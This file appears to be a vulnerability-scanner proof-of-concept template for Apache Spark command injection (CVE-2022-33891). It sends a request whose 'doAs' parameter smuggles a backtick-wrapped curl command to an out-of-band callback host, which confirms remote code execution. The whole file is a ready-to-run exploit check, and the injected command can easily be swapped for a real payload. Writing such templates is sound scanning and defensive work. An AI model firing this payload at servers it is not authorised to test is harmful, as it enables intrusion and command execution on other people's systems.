name: poc-yaml-apache-spark-rce-cve-2022-33891
manual: true
transport: http
set:
    originHost: request.url.host
    reverse: newReverse()
    reverseHost: reverse.url.host
    reverseURL: reverse.url.path
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /?doAs=`curl%20http://{{reverseHost}}{{reverseURL}}`
        expression: reverse.wait(5)
expression: r0()
detail:
    author: hanxiansheng26(https://github.com/hanxiansheng26)
    links:
        - https://blog.csdn.net/qq_42660246/article/details/125902229
    vulnerability:
        id: CT-460783
        level: high
